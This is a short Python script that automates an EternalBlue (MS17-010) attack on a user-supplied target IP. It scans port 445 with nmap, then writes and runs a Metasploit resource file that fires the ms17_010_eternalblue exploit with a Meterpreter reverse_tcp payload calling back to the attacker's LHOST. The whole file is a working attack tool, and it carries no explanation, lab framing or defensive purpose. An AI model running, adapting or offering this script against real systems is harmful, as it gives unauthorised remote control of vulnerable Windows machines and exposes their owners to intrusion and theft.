import subprocess

def run_nmap_scan(target_ip):
    print("[+] Running Nmap scan...")
    subprocess.run(["nmap", "-p445", target_ip])

def run_nmap_vuln_scan(target_ip):
    print("[+] Checking for MS17-010 vulnerability with Nmap...")
    subprocess.run(["nmap", "--script", "vuln", "-p445", target_ip])

def exploit_eternalblue(target_ip, lhost):
    print("[+] Launching Metasploit and exploiting MS17-010...")

    # Create a resource script for Metasploit to automate the process
    msf_script = f"""
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS {target_ip}
    set LHOST {lhost}
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    exploit
    """

    # Write to a temporary resource file
    with open("msf_script.rc", "w") as file:
        file.write(msf_script)

    # Run Metasploit with the script
    subprocess.run(["msfconsole", "-q", "-r", "msf_script.rc"])

if __name__ == "__main__":
    target = input("Enter target IP: ")
    lhost = input("Enter your LHOST IP: ")

    run_nmap_scan(target)
    run_nmap_vuln_scan(target)
    exploit_eternalblue(target, lhost)

